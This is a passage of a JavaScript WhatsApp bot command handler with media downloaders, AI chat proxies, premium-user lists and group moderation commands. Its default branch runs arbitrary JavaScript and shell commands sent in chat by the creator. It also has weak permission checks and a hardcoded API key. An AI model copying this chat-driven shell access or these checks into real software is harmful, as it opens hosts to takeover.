‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
Lazack28.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "public": {
  if (!isPremium) return reply("sorry, you do not have access");
  Lazack28.public = true;
  reply("*successfully changed the bot to public mode*");
}
break

case "self": {
  if (!isPremium) return reply("sorry, you do not have access");
  Lazack28.public = false;
  reply("*successfully changed the bot to self mode*");
}
break

case 'addprem':
if (!isPremium) return reply(" sorry you dont have acess.")
if (!args[0]) return reply(`Use ${prefix+command} number\nexample${prefix+command} 255734xx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Lazack28.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`oke ${prrkek} telah diberikan akses`)
break

case 'delprem':
if (!isPremium) return reply(" sorry you dont have acess.")
if (!args[0]) return reply(`Use ${prefix+command} number\nexample${prefix+command} 255734xx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`yah ${ya} tidak memiliki akses lagi`)
break


case "ai": case "leptonai": case "letmegpt": {
    if (!text) return m.reply("Masukan teks!");
    axios({
        method: 'POST',
        url: 'https://api.manaxu.my.id/api/ai/search',
        headers: {
            'x-api-key': 'key-manaxu-free',
            'Content-Type': 'application/json'
        },
        data: {
            question: text,
            model: command
        }
    })
    .then(_ => {
        m.reply(_.data.result);
    })
    .catch(e => {
        m.reply(e.message);
        console.error(e);
    });
}
break;

/**
  * Feature Ai With Logic & Sessions Made by Lazack28
  * Don't forget to follow
  * https://whatsapp.com/channel/0029VazvJLp5Ui2Skrlhai3n
*/

case "ai": {
  if (!text) return m.reply("Ada apa?");
  const aiSessions = shyzu.ai_sessions ?? {};
  const senderId = m.sender;

  if (!aiSessions[senderId]) {
    aiSessions[senderId] = { messages: [] };
  }

  const msgs = [
    ...aiSessions[senderId].messages,
    { content: text, role: "user" }
  ];

  const api_url = 'https://api.manaxu.my.id/api/ai';
  const api_key = 'key-manaxu-free';

  axios({
    method: 'POST',
    url: api_url,
    headers: {
      'x-api-key': api_key,
      'Content-Type': 'application/json'
    },
    data: {
      logic: 'hi brother, am still under development.',
      messages: msgs
    }
  })
  .then(response => {
    if (response.status === 200) {
      const { result } = response.data;
      m.reply(result ?? "hello brother");
      aiSessions[senderId].messages.push({ content: text, role: "user" });
      aiSessions[senderId].messages.push({ content: result, role: "assistant" });
      shyzu.ai_sessions = aiSessions;
    } else {
      m.reply("hello brother");
    }
  })
  .catch(error => {
    console.error(error);
    m.reply("failed to get response");
  });
}
break;

//===========TOOLS MENU=========//
case 'tiktok': case 'tt': {
  if (!text) return reply(`Contoh: ${prefix + command} link`);
  reply("please wait..")
 const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*
 *Video dari* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_
\`⏤͟͟͞͞ Downloader By ${global.namaOwner}\`
`;
 Lazack28.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
}
break

case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(example("dengan mengirim/reply foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
}
reply("please wait..")
var media = await Lazack28t.downloadAndSaveMediaMessage(qmsg)
await Lazack28.sendStimg(m.chat, media, m, {packname: `𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 ${namaBot} 👑`})
await fs.unlinkSync(media)
}
break

case 'splay': {
 const axios = require("axios");
 if (!text) return m.reply('please use the comand with the prompt example `Kewer Kewer`');

 await reply("please wait..");

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;
 
 // Pilih hasil pertama dari data pencarian
 const data = searchData[0];
 if (!data) return reply("mmh keep waiting.");

 // Teks yang akan dikirimkan
 const tekswait = `*𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐩𝐥𝐚𝐲𝐞𝐫*

- *tittle:* ${data.title}
- *Artist:* ${data.artist}
- *URL:* ${data.url}`;

 // Mengirim pesan informasi lagu
 await Lazack28.sendMessage(m.chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: { 
 showAdAttribution: true,
 title:`${data.title}`,
 body:"SPOTIFY SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: m });

 // URL API untuk download lagu
 const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
 // Mendapatkan data dari API
 let response = await fetch(downloadApiUrl);
 
 // Memastikan respon adalah tipe audio
 if (response.headers.get("content-type") === "audio/mpeg") {
 // Mengirim audio melalui WhatsApp
 await Lazack28.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
 } else {
 m.reply("Gagal mendapatkan file audio.");
 }
 } catch (error) {
 console.error(error);
 m.reply("failed to get the the musics.");
 }
}
break

case 'hd':
case 'hdr': 
case 'hdimg':
case 'remini':
case 'enhance': {
if (!/image/.test(mime)) return reply(`${prefix+command}`)
reply("please wait..")
let media = await quoted.download()
let proses = await remini(media, "enhance");
Lazack28.sendMessage(m.chat, { image: proses, caption: 'BERHASIL ENCHANTED ✅'}, { quoted: m})
}
break
case 'tourl': {
const FormData = require("form-data");
const { fromBuffer } = require("file-type");
const fakeUserAgent = require("fake-useragent");
const { filesize } = require('filesize');
	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || ''
	const createFormData = (content, fieldName, ext) => {
 const { mime } = fromBuffer(content) || {};
 const formData = new FormData();
 formData.append(fieldName, content, `${new Date()}.${ext}`);
 return formData;
};

const catbox = async (content) => {
 try {
 /*
 @ CatBox Uploader
 $ Create by Syaii
 */
 const { ext, mime } = (await fromBuffer(content)) || {};
 const formData = createFormData(content, "fileToUpload", ext);
 formData.append("reqtype", "fileupload");
 const response = await fetch("https://catbox.moe/user/api.php", {
 method: "POST",
 body: formData,
 headers: {
 "User-Agent": fakeUserAgent(),
 },
 });
 return await response.text();
 } catch (error) {
 throw false;
 }
 }
	if (!mime) return reply('reply media!')
	reply("please wait..")
	let media = await q.download()
	let link = await catbox(media)
	let size = await fetch(link)
	size = await size.text()
	size = await filesize(size.length)
	let caption = `*SUCCES UPLOAD A FILE*

📊 *S I Z E :* ${size} Byte
🔗 *L I N K :* ${link} !
`
await Lazack28.sendMessage(m.chat,{image: {url: link}, caption: caption }, { quoted: qtext2 })
}
break

case "kick": case "kik": {
if (!m.isGroup) return reply("Only Group")
if (!isCreator && !m.isAdmins) return reply("Only Owner!")
if (!m.isBotAdmins) return Reply("only admins")
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Lazack28.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("really she left")
const res = await Lazack28.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`kicked ${input.split("@")[0]} in the group`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == Lazack28) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
